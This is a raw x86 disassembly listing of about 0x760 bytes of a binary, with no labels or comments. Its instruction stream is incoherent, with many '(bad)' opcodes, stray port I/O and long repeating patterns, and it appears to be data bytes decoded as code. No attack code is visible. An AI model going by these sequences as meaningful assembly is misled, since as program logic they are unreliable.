  4419e7:	std    
  4419e8:	dec    DWORD PTR fs:0xdb96732
  4419ef:	mov    BYTE PTR [edi+0x76],ah
  4419f2:	or     eax,0xd8867c2
  4419f7:	(bad)  
  4419f8:	inc    edi
  4419f9:	cmp    al,0xd
  4419fb:	or     BYTE PTR [esi+0x28],al
  4419fe:	(bad)  
  441a00:	add    BYTE PTR [eax],al
  441a02:	add    BYTE PTR [eax],al
  441a04:	add    BYTE PTR [esi-0x45],al
  441a07:	push   cs
  441a08:	jbe    0x441a50
  441a0a:	fimul  DWORD PTR [esi]
  441a0c:	mov    WORD PTR [esi-0x5943f181],fs
  441a12:	xchg   esi,eax
  441a13:	push   cs
  441a14:	add    ebp,DWORD PTR [ecx-0x5eb5efd9]
  441a1a:	in     al,0x17
  441a1c:	fmul   QWORD PTR [ecx-0x7fdeeeab]
  441a22:	sbb    edx,DWORD PTR [ecx]
  441a24:	pop    ebp
  441a25:	mov    BYTE PTR [ebx+0x11],cl
  441a28:	add    BYTE PTR [ebx+0x6b121263],al
  441a2e:	add    al,0x12
  441a30:	arpl   WORD PTR cs:[ecx],sp
  441a33:	adc    ch,BYTE PTR [esi+0x6b]
  441a36:	fcom   QWORD PTR [ecx]
  441a38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441a39:	arpl   WORD PTR [ecx+0x3c4a1211],si
  441a3f:	adc    esi,DWORD PTR [eax+0x42]
  441a42:	fist   DWORD PTR [edx]
  441a44:	mov    dl,0x4a
  441a46:	adc    BYTE PTR [ebx],dl
  441a48:	adc    DWORD PTR ds:0xad7e1443,edi
  441a4e:	add    dh,BYTE PTR [esi]
  441a50:	sbb    al,0xdc
  441a52:	or     DWORD PTR [ecx+0x1b],eax
  441a55:	sub    BYTE PTR [ecx],cl
  441a57:	push   cs
  441a58:	sbb    ebx,DWORD PTR [esi+0x561a5208]
  441a5e:	or     BYTE PTR [eax+0x19],dl
  441a61:	jae    0x441a71
  441a63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441a64:	pop    ds
  441a65:	lds    ecx,FWORD PTR [esi]
  441a67:	sti    
  441a68:	pop    ds
  441a69:	add    BYTE PTR [eax],al
  441a6b:	add    BYTE PTR [eax],al
  441a6d:	add    BYTE PTR [esi+0x31f1b0d],dl
  441a73:	or     al,0x9c
  441a75:	sbb    eax,0x1dd30beb
  441a7a:	je     0x441a87
  441a7c:	add    al,0x1d
  441a7e:	mov    dh,0xb
  441a80:	inc    esi
  441a81:	sbb    eax,0x1c6d0ba1
  441a86:	in     eax,dx
  441a87:	or     bh,BYTE PTR [edi+0x1c]
  441a8a:	and    eax,0x751c9c0b
  441a8f:	add    ah,bh
  441a91:	arpl   ax,si
  441a93:	dec    edx
  441a94:	push   ss
  441a95:	add    esi,DWORD PTR [ebp+0x2]
  441a98:	stc    
  441a99:	adc    esp,DWORD PTR [ecx+0x48143112]
  441a9f:	adc    cl,BYTE PTR [edi]
  441aa1:	adc    al,0x22
  441aa3:	adc    al,BYTE PTR [edx-0x4bee6bed]
  441aa9:	adc    cl,BYTE PTR [ebp+0x11]
  441aac:	arpl   WORD PTR [edx],dx
  441aae:	int    0x10
  441ab0:	jbe    0x441ac4
  441ab2:	lods   al,BYTE PTR ds:[esi]
  441ab3:	adc    cl,ch
  441ab5:	adc    DWORD PTR [edi],ebx
  441ab7:	adc    cl,dl
  441ab9:	adc    esi,edx
  441abb:	psraw  mm2,QWORD PTR [eax]
  441abe:	push   ecx
  441abf:	movhps QWORD PTR [ecx],xmm2
  441ac2:	dec    edx
  441ac3:	pop    gs
  441ac5:	adc    BYTE PTR [ecx],bh
  441ac7:	setb   BYTE PTR [eax]
  441aca:	add    ecx,DWORD PTR [edi]
  441acc:	add    BYTE PTR [ecx+0x65],bl
  441acf:	outs   dx,DWORD PTR ds:[esi]
  441ad0:	sub    al,0x4c
  441ad2:	add    BYTE PTR [eax],al
  441ad4:	add    BYTE PTR [eax],al
  441ad6:	add    BYTE PTR [ebp-0x7aaed399],al
  441adc:	fwait
  441add:	sub    al,0x54
  441adf:	test   DWORD PTR [eax+0x4385282c],edx
  441ae5:	sub    al,0x1d
  441ae7:	gs aaa 
  441ae9:	sub    al,0x20
  441aeb:	gs sub al,0x2c
  441aee:	add    al,0x65
  441af0:	pop    edi
  441af1:	sub    al,0xf9
  441af3:	push   0x53
  441af5:	sub    al,0xec
  441af7:	add    BYTE PTR ds:0xf57af434,0x33
  441afe:	push   ds
  441aff:	test   ebx,eax
  441b01:	xor    esp,DWORD PTR ds:0x4033b385
  441b07:	gs leave 
  441b09:	xor    ebx,DWORD PTR [ebp+eiz*2-0x5c]
  441b0d:	xor    edi,DWORD PTR [ebx+0x65]
  441b10:	mov    esi,DWORD PTR [ebx]
  441b12:	lods   al,BYTE PTR ds:[esi]
  441b13:	gs inc eax
  441b15:	xor    ebx,DWORD PTR [eax-0xeccb17b]
  441b1b:	test   DWORD PTR [ebx],esp
  441b1d:	xor    esp,ebx
  441b1f:	test   DWORD PTR [ebp+0x7f840632],ebp
  441b25:	xor    bh,BYTE PTR [ebx+0x64]
  441b28:	xchg   edx,eax
  441b29:	xor    al,BYTE PTR [esp+eiz*2+0x35]
  441b2d:	xor    ah,BYTE PTR [edx-0x7acdd89c]
  441b33:	push   DWORD PTR fs:[ecx]
  441b36:	fld    DWORD PTR [esp+ebp*8+0xc31]
  441b3d:	add    BYTE PTR [eax],al
  441b3f:	add    BYTE PTR [edi-0x78e7cde1],al
  441b45:	adc    esi,DWORD PTR [edx]
  441b47:	adc    al,0x87
  441b49:	mov    ah,0x31
  441b4b:	pop    edi
  441b4c:	mov    BYTE PTR [bx+di],dh
  441b4f:	add    BYTE PTR [ebx-0xc],al
  441b52:	jmp    0xda37:0x18f49c36
  441b59:	hlt    
  441b5a:	pop    ebx
  441b5b:	aaa    
  441b5c:	ds hlt 
  441b5e:	gs aaa 
  441b60:	or     ah,dh
  441b62:	test   BYTE PTR [edi],dh
  441b64:	(bad)  
  441b65:	cmc    
  441b66:	mov    ecx,0xdcf56c37
  441b6b:	aaa    
  441b6c:	push   ebx
  441b6d:	hlt    
  441b6e:	repz aaa 
  441b70:	jbe    0x441b67
  441b72:	stc    
  441b73:	aaa    
  441b74:	inc    esi
  441b75:	in     eax,dx
  441b76:	adc    BYTE PTR [eax],bh
  441b78:	and    ch,ch
  441b7a:	sbb    al,0x38
  441b7c:	jmp    0x441b6a
  441b7e:	xor    al,0x38
  441b80:	imul   esp,esi,0x54
  441b83:	cmp    BYTE PTR [edi-0x66c79f1a],ch
  441b89:	in     eax,dx
  441b8a:	xchg   ecx,eax
  441b8b:	cmp    al,bh
  441b8d:	in     al,dx
  441b8e:	scas   al,BYTE PTR es:[edi]
  441b8f:	cmp    al,dh
  441b91:	in     al,dx
  441b92:	sar    BYTE PTR [eax],cl
  441b94:	sub    al,0xed
  441b96:	fdivr  QWORD PTR [eax]
  441b98:	addr16 out 0x71,eax
  441b9b:	cmp    DWORD PTR [esi+eiz*8-0x75],ebx
  441b9f:	cmp    esi,esi
  441ba1:	in     eax,0xcf
  441ba3:	cmp    DWORD PTR [eax],eax
  441ba5:	add    BYTE PTR [eax],al
  441ba7:	add    BYTE PTR [eax],al
  441ba9:	mov    ah,0xe5
  441bab:	cld    
  441bac:	cmp    edi,edx
  441bae:	out    0x11,al
  441bb0:	cmp    dl,BYTE PTR [eax]
  441bb2:	out    0x39,eax
  441bb4:	cmp    cl,ah
  441bb6:	out    0x74,al
  441bb8:	cmp    al,BYTE PTR [esi-0x19]
  441bbb:	(bad)  
  441bbc:	cmp    bl,BYTE PTR [edx]
  441bbe:	out    0xaf,eax
  441bc0:	cmp    ch,BYTE PTR [edx-0x19]
  441bc3:	enter  0x6a3a,0xe7
  441bc7:	jmp    0x441c03
  441bc9:	cmp    eax,0x753b0de7
  441bce:	add    al,0x19
  441bd0:	das    
  441bd1:	dec    esi
  441bd2:	xchg   edx,eax
  441bd3:	sbb    DWORD PTR [eax+0x4e],esi
  441bd6:	in     eax,0x19
  441bd8:	or     eax,0xd0111241
  441bdd:	cmp    ecx,ebp
  441bdf:	adc    ah,bl
  441be1:	mov    cl,0x5b
  441be3:	pop    ss
  441be4:	bound  ebp,QWORD PTR [eax-0x5cb8e9bb]
  441bea:	(bad)  
  441beb:	push   ss
  441bec:	jl     0x441b89
  441bee:	fist   WORD PTR [esi]
  441bf0:	xchg   edi,eax
  441bf1:	xchg   ebx,eax
  441bf2:	push   es
  441bf3:	pop    ss
  441bf4:	mov    bh,0x8b
  441bf6:	sbb    DWORD PTR [edi],edx
  441bf8:	int3   
  441bf9:	and    DWORD PTR [edi+edx*1],0xffffffee
  441bfd:	jnp    0x441c26
  441bff:	adc    eax,0x158d721f
  441c04:	cmp    ch,BYTE PTR [edx-0x57]
  441c07:	push   ss
  441c08:	jge    0x441c6c
  441c0a:	adc    BYTE PTR [esi],0xb8
  441c0d:	add    BYTE PTR [eax],al
  441c0f:	add    BYTE PTR [eax],al
  441c11:	add    BYTE PTR [edx-0x6a],bl
  441c14:	push   ss
  441c15:	aad    0x52
  441c17:	pop    ecx
  441c18:	dec    esp
  441c19:	std    
  441c1a:	or     dh,BYTE PTR [esi+0x26750003]
  441c20:	or     al,0x5e
  441c22:	inc    ebp
  441c23:	lds    edx,FWORD PTR [ebx]
  441c25:	das    
  441c26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441c27:	push   eax
  441c28:	or     eax,0xd0ea441
  441c2d:	jo     0x441bd3
  441c2f:	scas   eax,DWORD PTR es:[edi]
  441c30:	or     al,0xd3
  441c32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441c33:	jbe    0x441c41
  441c35:	add    eax,DWORD PTR [edi-0x7899edb5]
  441c3b:	inc    ebp
  441c3c:	adc    dl,BYTE PTR [edi+eax*4-0x7835ee5b]
  441c43:	adc    DWORD PTR [bx+si],eax
  441c46:	xchg   dx,ax
  441c48:	adc    edi,DWORD PTR [ecx]
  441c4a:	data16 add bh,BYTE PTR [edi-0x36ecf2ec]
  441c51:	adc    al,0xf9
  441c53:	adc    edi,DWORD PTR [ecx]
  441c55:	adc    eax,0x154013b3
  441c5a:	pop    esp
  441c5b:	push   cs
  441c5c:	cld    
  441c5d:	rdtsc  
  441c5f:	push   cs
  441c60:	(bad)  
  441c61:	(bad)  
  441c63:	push   cs
  441c64:	push   ecx
  441c65:	adc    BYTE PTR [edx],bl
  441c67:	push   cs
  441c68:	ins    DWORD PTR es:[edi],dx
  441c69:	adc    al,al
  441c6b:	or     eax,0x919125b
  441c70:	ss sbb eax,0x1d1c0b4d
  441c76:	add    BYTE PTR [eax],al
  441c78:	add    BYTE PTR [eax],al
  441c7a:	add    BYTE PTR [ebx],bl
  441c7c:	push   es
  441c7d:	das    
  441c7e:	sbb    BYTE PTR [eax],ch
  441c80:	pop    es
  441c81:	out    0x3,eax
  441c83:	inc    eax
  441c84:	inc    edi
  441c85:	rol    BYTE PTR [ebx],cl
  441c87:	jne    0x441c8b
  441c89:	repz adc esi,DWORD PTR [edx+0x61164a11]
  441c90:	pop    es
  441c91:	inc    ebx
  441c92:	sbb    DWORD PTR [ebp+0x2],esi
  441c95:	out    0xf3,eax
  441c97:	sbb    DWORD PTR [edi+0x2a],eax
  441c9a:	add    al,0x75
  441c9c:	add    ch,BYTE PTR [esi+0x14]
  441c9f:	xchg   ecx,eax
  441ca0:	push   cs
  441ca1:	mov    dh,0xf
  441ca3:	jnp    0x441cb2
  441ca5:	sti    
  441ca6:	push   cs
  441ca7:	mov    WORD PTR [eax],ss
  441ca9:	xor    BYTE PTR [edx],dl
  441cab:	outs   dx,DWORD PTR ds:[esi]
  441cac:	adc    BYTE PTR [eax+0x11],bh
  441caf:	punpckhwd mm2,QWORD PTR [bx+si]
  441cb3:	ret    
  441cb4:	push   cs
  441cb5:	ret    0x8a1b
  441cb8:	or     bl,BYTE PTR [edx]
  441cba:	sbb    al,0x52
  441cbc:	or     bl,BYTE PTR [ebx+ebx*1+0x1b1709a0]
  441cc3:	sub    BYTE PTR [ecx],cl
  441cc5:	outs   dx,DWORD PTR ds:[esi]
  441cc6:	sbb    ch,al
  441cc8:	or     BYTE PTR [eax],al
  441cca:	mov    eax,ds:0x9736398f
  441ccf:	(bad)  
  441cd0:	sub    esi,DWORD PTR [esi]
  441cd2:	dec    ebp
  441cd3:	jg     0x441d32
  441cd5:	ss pop ebx
  441cd7:	jg     0x441d2e
  441cd9:	cmp    cl,ch
  441cdb:	push   esi
  441cdc:	inc    ebp
  441cdd:	clc    
  441cde:	or     DWORD PTR [eax],eax
  441ce0:	add    BYTE PTR [eax],al
  441ce2:	add    BYTE PTR [eax],al
  441ce4:	jno    0x441ce8
  441ce6:	add    ch,ah
  441ce8:	sbb    ax,0x6a30
  441cec:	popa   
  441ced:	xchg   esi,eax
  441cee:	sub    al,0x72
  441cf0:	mov    edi,esp
  441cf2:	aaa    
  441cf3:	clc    
  441cf4:	mov    cs,WORD PTR [edi+0x54807136]
  441cfa:	xor    eax,0x279de
  441cff:	jmp    0x8e3c646a
  441d04:	jbe    0x441d08
  441d06:	add    BYTE PTR [eax-0x50d0789a],al
  441d0c:	pusha  
  441d0d:	sub    DWORD PTR ds:0x3720857f,0xffffffbc
  441d14:	mov    edi,eax
  441d16:	xor    al,0x5
  441d18:	jl     0x441d3c
  441d1a:	cmp    eax,DWORD PTR ds:0x53b1a7c
  441d20:	ins    BYTE PTR es:[edi],dx
  441d21:	adc    bh,BYTE PTR [ebx]
  441d23:	adc    eax,0x53b0a6c
  441d28:	pop    esp
  441d29:	ret    0x253a
  441d2c:	pop    esp
  441d2d:	mov    edx,0xb28c253a
  441d32:	cmp    dl,BYTE PTR ds:0x453aaa8c
  441d38:	jl     0x441d1c
  441d3a:	cmp    al,BYTE PTR ds:0x53ada7c
  441d40:	ins    BYTE PTR es:[edi],dx
  441d41:	sar    BYTE PTR [edx],cl
  441d43:	adc    eax,0x3aca6c
  441d48:	add    BYTE PTR [eax],al
  441d4a:	add    BYTE PTR [eax],al
  441d4c:	add    BYTE PTR [eax-0x15],bh
  441d4f:	jg     0x441d8e
  441d51:	push   eax
  441d52:	jmp    0x441cdb
  441d54:	cmp    eax,0x3d8feb18
  441d59:	inc    eax
  441d5a:	jmp    0x441cf3
  441d5c:	cmp    eax,0x3d9febf8
  441d61:	lock jmp 0x441d71
  441d64:	aas    
  441d65:	xlat   BYTE PTR ds:[ebx]
  441d66:	in     al,dx
  441d67:	dec    ecx
  441d68:	aas    
  441d69:	(bad)  
  441d6b:	popa   
  441d6c:	aas    
  441d6d:	mov    edx,0x183f8fec
  441d72:	in     eax,dx
  441d73:	mov    al,ds:0xcfed953f
  441d78:	aas    
  441d79:	js     0x441d68
  441d7b:	out    0x3f,eax
  441d7d:	cwde   
  441d7e:	in     eax,dx
  441d7f:	(bad)  
  441d80:	dec    DWORD PTR [ecx+eax*2-0x5]
  441d84:	jmp    DWORD PTR [eax]
  441d86:	add    DWORD PTR [eax],eax
  441d88:	add    BYTE PTR [edx],ch
  441d8a:	icebp  
  441d8b:	adc    DWORD PTR [eax],esi
  441d8d:	xor    esi,ecx
  441d8f:	cmp    BYTE PTR [eax],dh
  441d91:	or     dh,cl
  441d93:	push   ecx
  441d94:	xor    BYTE PTR [edx],al
  441d96:	icebp  
  441d97:	jno    0x441dc9
  441d99:	enter  0x97ee,0x30
  441d9d:	icebp  
  441d9e:	lock mov esp,0xd5f0de30
  441da4:	xor    BYTE PTR [esi],dh
  441da6:	icebp  
  441da7:	cmc    
  441da8:	xor    BYTE PTR [esi+ebp*8],cl
  441dab:	sbb    esi,DWORD PTR [ecx]
  441dad:	gs out dx,eax
  441daf:	dec    edx
  441db0:	xor    DWORD PTR [eax],eax
  441db2:	add    BYTE PTR [eax],al
  441db4:	add    BYTE PTR [eax],al
  441db6:	mov    cl,0xef
  441db8:	push   0x98efa931
  441dbd:	xor    DWORD PTR [esi-0x15],edi
  441dc0:	xchg   DWORD PTR ds:0x3fc6ebbf,edi
  441dc6:	in     al,dx
  441dc7:	jmp    0x441dc8
  441dc9:	push   DWORD PTR [ebp+0x5b]
  441dcc:	lods   al,BYTE PTR ds:[esi]
  441dcd:	cld    
  441dce:	retf   0xfc3e
  441dd1:	push   DWORD PTR [ebp-0xb]
  441dd4:	adc    esi,DWORD PTR [ebp+eax*4+0x2b]
  441dd8:	adc    ebx,DWORD PTR [esi]
  441dda:	fs call 0x4ca780e9
  441de0:	or     al,BYTE PTR [edi+0x731b2b6b]
  441de6:	pop    esp
  441de7:	xchg   DWORD PTR [ecx],edx
  441de9:	mov    bh,0x52
  441deb:	push   ss
  441dec:	adc    al,BYTE PTR [eax]
  441dee:	jne    0x441e4b
  441df0:	fdiv   st(4),st
  441df2:	sbb    BYTE PTR [edx+0x4075fffc],0xe
  441df9:	int    0xa7
  441dfb:	ins    DWORD PTR es:[edi],dx
  441dfc:	or     eax,0xff8a680
  441e01:	cmp    DWORD PTR [ecx-0x5e95f774],ebp
  441e07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441e08:	or     BYTE PTR [edx-0x66f53975],cl
  441e0e:	add    DWORD PTR ds:0xa47c170b,0x1b
  441e15:	popf   
  441e16:	jl     0x441e2f
  441e18:	sbb    al,0xab
  441e1a:	add    BYTE PTR [eax],al
  441e1c:	add    BYTE PTR [eax],al
  441e1e:	add    BYTE PTR [edi-0x14],ch
  441e21:	push   ss
  441e22:	daa    
  441e23:	push   0x633f178e
  441e28:	rcl    DWORD PTR [edx],0x60
  441e2b:	pop    edx
  441e2c:	loope  0x441e40
  441e2e:	hlt    
  441e2f:	push   edx
  441e30:	das    
  441e31:	adc    al,BYTE PTR [eax]
  441e33:	jne    0x441e8e
  441e35:	int3   
  441e36:	cld    
  441e37:	add    bh,BYTE PTR [edx+0x3]
  441e3a:	add    BYTE PTR [ebp-0x35],dh
  441e3d:	adc    edi,DWORD PTR [ebp+eiz*4-0x5a37ec69]
  441e44:	arpl   WORD PTR [ebx],dx
  441e46:	aam    0xa5
  441e48:	add    bh,BYTE PTR [esi-0x6fed44ec]
  441e4e:	adc    al,0xc5
  441e50:	adc    bl,BYTE PTR [edx-0x1bed30ec]
  441e56:	adc    ch,BYTE PTR [esi+0x11]
  441e59:	fcom   QWORD PTR [edx]
  441e5b:	pop    esi
  441e5c:	adc    eax,edx
  441e5e:	adc    ah,BYTE PTR [ebx+0x11]
  441e61:	mov    edx,0x22116e12
  441e66:	adc    eax,DWORD PTR [ebp+0x11]
  441e69:	mov    esi,0xc9111212
  441e6e:	adc    cl,BYTE PTR [ecx]
  441e70:	adc    edx,edx
  441e72:	adc    dh,bh
  441e74:	adc    esi,edi
  441e76:	adc    DWORD PTR [ecx+0x10],ecx
  441e79:	dec    edx
  441e7a:	adc    al,BYTE PTR [esi+0x13116410]
  441e80:	cmovb  edx,DWORD PTR [ecx]
  441e83:	add    BYTE PTR [eax],al
  441e85:	add    BYTE PTR [eax],al
  441e87:	add    BYTE PTR [ecx+0xf],ah
  441e8a:	jecxz  0x441e9b
  441e8c:	jmp    0xf0e:0x5110290e
  441e93:	adc    BYTE PTR [ecx+0xe],cl
  441e96:	movups xmm6,XMMWORD PTR [ecx+0xd]
  441e9a:	fisttp WORD PTR [esi]
  441e9c:	imul   ecx,DWORD PTR ds:0xd910edf,0xd690ecf
  441ea6:	scas   eax,DWORD PTR es:[edi]
  441ea7:	push   cs
  441ea8:	mov    cl,0xd
  441eaa:	lahf   
  441eab:	push   cs
  441eac:	leave  
  441ead:	or     eax,0xd910f3f
  441eb2:	dec    edi
  441eb3:	jns    0xf1536dc6
  441eb9:	or     al,0x5f
  441ebb:	push   cs
  441ebc:	jmp    0xd1527dcd
  441ec1:	or     al,0x8f
  441ec3:	push   cs
  441ec4:	sub    DWORD PTR ds:0x3e7b7100,ecx
  441eca:	xor    ah,BYTE PTR [ecx-0x3ecdd18d]
  441ed0:	imul   ebx,DWORD PTR [esi+0x32],0xffffff91
  441ed4:	or     DWORD PTR [esi+0x32],0xffffff91
  441ed8:	jnp    0x441edc
  441eda:	add    cl,ch
  441edc:	ss inc esi
  441ede:	clc    
  441edf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441ee0:	jbe    0x441ee4
  441ee2:	add    cl,ch
  441ee4:	xchg   dh,bh
  441ee6:	das    
  441ee7:	fld    QWORD PTR [esi+0xbd2fea]
  441eed:	add    BYTE PTR [eax],al
  441eef:	add    BYTE PTR [eax],al
  441ef1:	xchg   BYTE PTR [edx-0x557a42d4],dh
  441ef7:	sub    al,0xbd
  441ef9:	gs loop 0x441f28
  441efc:	int    0x65
  441efe:	fisubr DWORD PTR [edi*4-0x42d32d9b]
  441f05:	gs retf 0xbd2c
  441f09:	test   DWORD PTR [esi+0x76858d2c],edx
  441f0f:	sub    al,0x25
  441f11:	test   DWORD PTR [esi+0x2c],edx
  441f14:	or     eax,0xe52c3685
  441f19:	adc    BYTE PTR [esi],0x34
  441f1c:	int    0x7a
  441f1e:	div    BYTE PTR [ebx]
  441f20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441f21:	jb     0x441ef9
  441f23:	xor    ecx,DWORD PTR [ebp+0x6533b66a]
  441f29:	adc    BYTE PTR [esi+0x767a4d33],0x33
  441f30:	and    eax,0xcd335672
  441f35:	jge    0x441f6d
  441f37:	xor    esp,ebp
  441f39:	ins    DWORD PTR es:[edi],dx
  441f3a:	push   ss
  441f3b:	xor    ecx,DWORD PTR ds:0x2532f66c
  441f41:	pop    esp
  441f42:	(bad)  
  441f43:	xor    al,BYTE PTR [eax]
  441f45:	test   al,0x1b
  441f47:	je     0x441f7e
  441f49:	pop    eax
  441f4a:	sbb    edx,DWORD PTR [ebp+esi*1+0x35b41bf8]
  441f51:	sbb    BYTE PTR [esp+edx*8],bl
  441f54:	xor    eax,0x0
  441f59:	add    al,ch
  441f5b:	sbb    esi,esp
  441f5d:	xor    eax,0x36141bd8
  441f62:	mov    eax,0x9836341b
  441f67:	sbb    al,0x54
  441f69:	ss push 0x1836741c
  441f6f:	sbb    al,0x94
  441f71:	cmp    BYTE PTR ss:[esp+esi*4],bl
  441f75:	fcomp  DWORD PTR ss:[esp+edx*8]
  441f79:	sub    BYTE PTR ss:[esp+esi*8],bl
  441f7d:	ss cwde 
  441f7f:	sbb    al,0x14
  441f81:	aaa    
  441f82:	js     0x441fa1
  441f84:	xor    al,0x37
  441f86:	fcomp  DWORD PTR [eax+edx*2]
  441f89:	aaa    
  441f8a:	fcomp  DWORD PTR [eax+ebx*2]
  441f8d:	aaa    
  441f8e:	adc    BYTE PTR [eax+eiz*2],bl
  441f91:	aaa    
  441f92:	cmp    BYTE PTR [eax+ebp*2],bl
  441f95:	aaa    
  441f96:	and    BYTE PTR [eax+esi*2],bl
  441f99:	aaa    
  441f9a:	clc    
  441f9b:	sbb    edi,DWORD PTR [eax+0x37]
  441f9e:	lock sbb eax,DWORD PTR [eax-0x77e227c9]
  441fa5:	aaa    
  441fa6:	mov    al,ds:0x9837901d
  441fab:	sbb    eax,0x1dd03798
  441fb0:	mov    al,ds:0xa81db837
  441fb5:	aaa    
  441fb6:	pusha  
  441fb7:	sbb    eax,0x1bf837b0
  441fbc:	mov    eax,0x37
  441fc1:	add    BYTE PTR [eax],al
  441fc3:	lock sbb ecx,eax
  441fc6:	aaa    
  441fc7:	jne    0x441ff4
  441fc9:	cld    
  441fca:	push   DWORD PTR [ebp+0x2b]
  441fcd:	cld    
  441fce:	push   DWORD PTR [ebp+0x2b]
  441fd1:	cld    
  441fd2:	push   DWORD PTR [ebp+0x2b]
  441fd5:	cld    
  441fd6:	push   DWORD PTR [ebp+0x2b]
  441fd9:	cld    
  441fda:	push   DWORD PTR [ebp+0x2b]
  441fdd:	cld    
  441fde:	push   DWORD PTR [ebp+0x2b]
  441fe1:	cld    
  441fe2:	push   DWORD PTR [ebp+0x2b]
  441fe5:	cld    
  441fe6:	push   DWORD PTR [ebp+0x2b]
  441fe9:	cld    
  441fea:	push   DWORD PTR [ebp+0x2b]
  441fed:	cld    
  441fee:	push   DWORD PTR [ebp+0x2b]
  441ff1:	cld    
  441ff2:	push   DWORD PTR [ebp+0x2b]
  441ff5:	cld    
  441ff6:	push   DWORD PTR [ebp+0x2b]
  441ff9:	cld    
  441ffa:	push   DWORD PTR [ebp+0x2b]
  441ffd:	cld    
  441ffe:	push   DWORD PTR [ebp+0x2b]
  442001:	cld    
  442002:	push   DWORD PTR [ebp+0x2b]
  442005:	cld    
  442006:	push   DWORD PTR [ebp+0x2b]
  442009:	cld    
  44200a:	push   DWORD PTR [ebp+0x2b]
  44200d:	cld    
  44200e:	push   DWORD PTR [ebp+0x2b]
  442011:	cld    
  442012:	push   DWORD PTR [ebp+0x29]
  442015:	cld    
  442016:	push   DWORD PTR [ebp+0x29]
  442019:	cld    
  44201a:	push   DWORD PTR [ebp+0x29]
  44201d:	cld    
  44201e:	push   DWORD PTR [ebp+0x29]
  442021:	cld    
  442022:	push   DWORD PTR [ebp+0x29]
  442025:	cld    
  442026:	inc    DWORD PTR [eax]
  442028:	add    BYTE PTR [eax],al
  44202a:	add    BYTE PTR [eax],al
  44202c:	jne    0x442057
  44202e:	cld    
  44202f:	push   DWORD PTR [ebp+0x29]
  442032:	cld    
  442033:	push   DWORD PTR [ebp+0x29]
  442036:	cld    
  442037:	push   DWORD PTR [ebp+0x29]
  44203a:	cld    
  44203b:	push   DWORD PTR [ebp+0x29]
  44203e:	cld    
  44203f:	push   DWORD PTR [ebp+0x29]
  442042:	cld    
  442043:	push   DWORD PTR [ebp+0x2]
  442046:	out    0x3,eax
  442048:	jne    0x44204c
  44204a:	out    0x3,eax
  44204c:	jne    0x442050
  44204e:	out    0x3,eax
  442050:	jne    0x442054
  442052:	out    0x3,eax
  442054:	jne    0x442058
  442056:	out    0x3,eax
  442058:	jne    0x44205c
  44205a:	out    0x3,eax
  44205c:	jne    0x442060
  44205e:	out    0x3,eax
  442060:	jne    0x442064
  442062:	out    0x3,eax
  442064:	jne    0x442068
  442066:	out    0x3,eax
  442068:	jne    0x44206c
  44206a:	out    0x3,eax
  44206c:	jne    0x442070
  44206e:	out    0x3,eax
  442070:	jne    0x442074
  442072:	out    0x3,eax
  442074:	jne    0x442078
  442076:	out    0x3,eax
  442078:	jne    0x44207c
  44207a:	out    0x3,eax
  44207c:	jne    0x442080
  44207e:	out    0x3,eax
  442080:	jne    0x442084
  442082:	out    0x3,eax
  442084:	jne    0x442088
  442086:	out    0x3,eax
  442088:	jne    0x44208c
  44208a:	out    0x3,eax
  44208c:	jne    0x442090
  44208e:	out    0x3,eax
  442090:	add    BYTE PTR [eax],al
  442092:	add    BYTE PTR [eax],al
  442094:	add    BYTE PTR [ebp+0x2],dh
  442097:	out    0x3,eax
  442099:	jne    0x44209d
  44209b:	out    0x3,eax
  44209d:	jne    0x4420a1
  44209f:	out    0x3,eax
  4420a1:	jne    0x4420a5
  4420a3:	out    0x3,eax
  4420a5:	jne    0x4420a9
  4420a7:	out    0x3,eax
  4420a9:	jne    0x4420ad
  4420ab:	out    0x3,eax
  4420ad:	jne    0x4420b1
  4420af:	out    0x3,eax
  4420b1:	jne    0x4420b5
  4420b3:	out    0x3,eax
  4420b5:	jne    0x4420b9
  4420b7:	out    0x3,eax
  4420b9:	jne    0x4420bd
  4420bb:	out    0x3,eax
  4420bd:	jne    0x4420c1
  4420bf:	out    0x3,eax
  4420c1:	jne    0x4420c5
  4420c3:	add    cl,ch
  4420c5:	jbe    0x4420c9
  4420c7:	add    cl,ch
  4420c9:	jbe    0x4420cd
  4420cb:	add    cl,ch
  4420cd:	jbe    0x4420d1
  4420cf:	add    cl,ch
  4420d1:	jbe    0x4420d5
  4420d3:	add    cl,ch
  4420d5:	jbe    0x4420d9
  4420d7:	add    cl,ch
  4420d9:	jbe    0x4420dd
  4420db:	add    cl,ch
  4420dd:	jbe    0x4420e1
  4420df:	add    cl,ch
  4420e1:	jbe    0x4420e5
  4420e3:	add    cl,ch
  4420e5:	jbe    0x4420e9
  4420e7:	add    cl,ch
  4420e9:	jbe    0x4420ed
  4420eb:	add    cl,ch
  4420ed:	jbe    0x4420f1
  4420ef:	add    cl,ch
  4420f1:	jbe    0x4420f5
  4420f3:	add    cl,ch
  4420f5:	jbe    0x4420f9
  4420f7:	add    cl,ch
  4420f9:	add    BYTE PTR [eax],al
  4420fb:	add    BYTE PTR [eax],al
  4420fd:	add    BYTE PTR [esi+0x2],dh
  442100:	add    cl,ch
  442102:	jbe    0x442106
  442104:	add    cl,ch
  442106:	jbe    0x44210a
  442108:	add    cl,ch
  44210a:	jbe    0x44210e
  44210c:	add    cl,ch
  44210e:	jbe    0x442112
  442110:	add    cl,ch
  442112:	jbe    0x442116
  442114:	add    cl,ch
  442116:	jbe    0x44211a
  442118:	add    cl,ch
  44211a:	jbe    0x44211e
  44211c:	add    cl,ch
  44211e:	jbe    0x442122
  442120:	add    cl,ch
  442122:	jbe    0x442126
  442124:	add    cl,ch
  442126:	jbe    0x44212a
  442128:	add    cl,ch
  44212a:	jbe    0x44212e
  44212c:	add    cl,ch
  44212e:	jbe    0x442132
  442130:	add    cl,ch
  442132:	jbe    0x442136
  442134:	add    cl,ch
  442136:	jbe    0x44213a
  442138:	add    cl,ch
  44213a:	jbe    0x44213e
  44213c:	add    cl,ch
  44213e:	jbe    0x442142
  442140:	add    BYTE PTR [eax],al
  442142:	sbb    al,0x2
  442144:	add    BYTE PTR [eax],al
  442146:	sbb    al,0x2
  442148:	add    BYTE PTR [eax],al
  44214a:	or     al,0x2
  44214c:	add    BYTE PTR [eax],al
  44214e:	or     al,0x2
